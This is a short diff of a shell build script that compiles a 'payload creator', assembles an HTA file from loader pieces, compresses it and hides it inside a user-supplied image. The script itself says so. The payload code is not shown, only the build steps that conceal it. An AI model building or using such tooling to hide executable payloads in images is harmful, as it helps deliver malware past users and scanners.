@@ -11,7 +11,7 @@ image=$1
 executable=$2
 
 # Compile payload creator
-gcc payload_creator/main.c \
+gcc payload_creator/hide_payload.c \
     -Wall -Wextra -Wpedantic \
     -Wformat=2 -Wno-unused-parameter -Wshadow \
     -Wwrite-strings -Wstrict-prototypes -Wold-style-definition \
@@ -38,6 +38,7 @@ cat payload_loader/create_script_utils/footer.html >> _tmp/index.hta
 
 zlib-flate -compress < _tmp/index.hta > _tmp/index.zip
 
+# Hide payload in provided image
 ./payload_creator/hide_payload $image _tmp/index.zip
 echo "Successfully hid your payload in the provided image, check with binwalk"
 
